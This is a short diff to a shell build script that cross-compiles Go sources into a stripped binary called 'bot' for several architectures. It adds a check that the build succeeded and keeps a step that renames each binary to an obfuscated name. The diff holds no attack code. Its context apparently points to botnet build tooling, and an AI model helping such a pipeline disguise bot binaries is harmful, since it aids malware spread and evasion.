@@ -27,9 +27,15 @@ build_for_arch() {
     
     if [ -n "$goarm" ]; then
         # ARM architectures require GOARM setting
-        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" go build -ldflags="-s -w" *.go
+        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" go build -ldflags="-s -w" -o bot *.go
     else
-        GOOS="$goos" GOARCH="$goarch" go build -ldflags="-s -w" *.go
+        GOOS="$goos" GOARCH="$goarch" go build -ldflags="-s -w" -o bot *.go
+    fi
+    
+    # Check if build succeeded
+    if [ ! -f "bot" ]; then
+        echo "ERROR: Build failed for $arch_name"
+        return 1
     fi
     
     # Rename the built binary to the obfuscated name from AMBS array
